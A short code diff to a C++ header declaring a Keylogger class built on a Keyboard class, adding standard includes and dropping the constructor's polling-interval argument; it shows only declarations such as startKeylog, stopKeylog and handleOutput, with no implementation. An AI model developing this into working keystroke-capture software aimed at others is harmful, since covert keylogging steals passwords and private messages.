@@ -1,6 +1,8 @@
 #pragma once
 #include <thread>
-
+#include <vector>
+#include <iostream>
+#include <locale>
 #include "keyboard.h"
 
 class Keylogger : public Keyboard {
@@ -11,7 +13,7 @@ private:
 	void handleOutput();
 
 public:
-	Keylogger(milliseconds polling);
+	Keylogger();
 
 	void startKeylog();
 	void stopKeylog();
